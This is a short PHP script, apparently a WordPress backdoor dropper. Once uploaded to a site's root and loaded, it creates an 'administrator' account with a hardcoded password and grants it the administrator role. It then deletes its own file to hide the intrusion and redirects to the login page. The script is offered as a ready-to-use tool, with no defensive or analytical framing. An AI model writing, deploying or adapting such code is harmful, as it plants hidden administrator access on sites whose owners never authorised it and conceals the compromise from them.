<?php
// ============================================
// WordPress Add Admin User Tool (Auto Delete + Redirect)
// ============================================

// Load WordPress core
require_once('wp-load.php');
require_once('wp-includes/registration.php');

$username   = 'administrator';
$password   = 'G0dKn0wM3&u';
$email      = 'xnxx@administrator.id';

// Check if exists
if (username_exists($username) || email_exists($email)) {
    echo "<h3 style='color:red;'>❌ User sudah ada atau email sudah terdaftar.</h3>";
    exit;
}

// Create user
$user_id = wp_create_user($username, $password, $email);

// Assign role admin
if (!is_wp_error($user_id)) {
    $user = new WP_User($user_id);
    $user->set_role('administrator');

    // Hapus file ini
    @unlink(__FILE__);

    // Redirect ke halaman login
    header("Location: ./wp-login.php");
    exit;

} else {
    echo "<h3 style='color:red;'>❌ Error: " . $user_id->get_error_message() . "</h3>";
}
?>